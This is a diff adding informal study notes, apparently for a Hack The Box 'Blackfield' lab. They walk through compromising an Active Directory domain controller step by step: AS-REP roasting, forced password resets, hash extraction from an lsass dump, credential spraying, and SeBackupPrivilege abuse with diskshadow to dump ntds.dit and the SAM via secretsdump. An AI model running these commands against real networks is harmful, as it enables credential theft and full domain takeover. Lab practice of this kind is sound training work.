@@ -1,0 +1,135 @@
+we do the nmap scan using:
+
+
+nmap -sC -sV -oA blackfield 10.10.10.192
+
+
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-19 02:42:06Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-04-19T02:42:41
+|_  start_date: N/A
+
+
+
+theres nothing much on the dns bit... it takes time to resolve to us
+
+we get not much info from rpc
+
+we check smb and we find the profiles$ share... it contains usernames which we can get there kerberos ticket... using getnpusers
+
+
+we get the username as support and password as "#00^BlackKnight"
+
+
+
+enum4linux -a -M -l -d -w BLACKFIELD.local -u support -p "#00^BlackKnight" blackfield.htb 2>&1 | tee "/home/isayar17_x401a/OSCP/HTB/OSCP_Labs/blackfield/enum4.txt"
+
+we use enum4linux to check details concerning the authenticated users
+
+
+using the details we can use bloodhound to get a map of the domain and then using blood hound and checking for First Degree Object Control and we found out we can change the password of the auditor user... but since we do not have a shell we can just use rpcclient to do the change
+
+setuserinfo2 audit2020 23 'isayar17!'(password policy constraints)
+
+
+
+
+
+
+we then check rpcclient as we login thorough rpc we see that we have 
+
+SeTrustedCredManAccessPrivilege --->this privs means we can change the password 
+
+make sure to enumerate using bloodhound
+
+
+
+we change the password , access the shares with the creds we've made then in the shares after we list recursively we see that we have another user as part of the domain admins... i.e Ipwn3dYourCompany 
+
+
+then when we access the next share.... i.e memory_analysis we get the lsass.zip which strikes our eye since we know that we can dump hashes from it either using mimikatz or a python linux alternative pypykatz 
+
+we use it and we get the hash belonging to svc_backup and when we test it out for usability using crackmapexec we find out that it can be used for winrm, smb  so we go with winrm firstly
+
+ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -H ldap://10.129.229.17:389  -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold  --->using this we get the lockout threshold to know if we are constrained
+
+pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes.txt ---->obtain hashes from lsass dump
+
+pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users.txt --->obtain users from lsass dump
+
+
+crackmapexec smb 10.129.229.17 -u users.txt -H hashes.txt ---> we use this to check if our command the users and hashes we have got can actually authenticate as winrm or smb
+
+
+we use winrm
+
+now for priv esc we see that our user has privs as SeBackupPrivilege
+
+from whoami /priv
+
+after checking the user info and domain we see that he is part of the backup operators group...
+
+Backup Operators is a default Windows group that is designed to backup and restore files on the computer using certain methods to read and write all (or most) files on the system.
+
+
+sooo we can abuse SeBackupPrivilege through utilizing diskshadow to create a new volume and alias it with the C drive so that we are able to read everything on C irregardles of my priviledges... IM doing this as the ntds.dit file which contains the creds might be in use... and thus I cannot copy it using the normal 
+
+SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll
+
+
+as *** Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns where we can copy a file and be able to read it... but for ntds its different..
+
+now we can copy the files to the current folder we are in 
+
+
+Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM c:\windows\temp\SYSTEM
+
+Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS
+
+dc= NTDS and SYSTEM 
+normalcomputer = system,sam,security files 
+
+If this wasn't a domain controller, there would be no NTDS.dit file to get passwords from, so we
+would need to download the SYSTEM, SAM and SECURITY files instead:
+
+Copy-FileSeBackupPrivilege h:\windows\system32\config\SECURITY
+c:\windows\temp\SECURITY
+
+Copy-FileSeBackupPrivilege h:\windows\system32\config\SAM c:\windows\temp\SAM
+
+secretsdump.py -ntds ntds -system system LOCAL -->DC
+
+
+secretsdump.py -security security -sam sam -system system LOCAL -->normal machine
+
+we get the hash belonging to the admin and then we log in
+
+
+
+
+set context persistent nowriters
+add volume c: alias temp
+create
+expose %temp% h:
+exit
+
+
+
+
+
+
+ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -p 389 -h 10.10.10.192 -
+b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold ---->check account lockout policy 
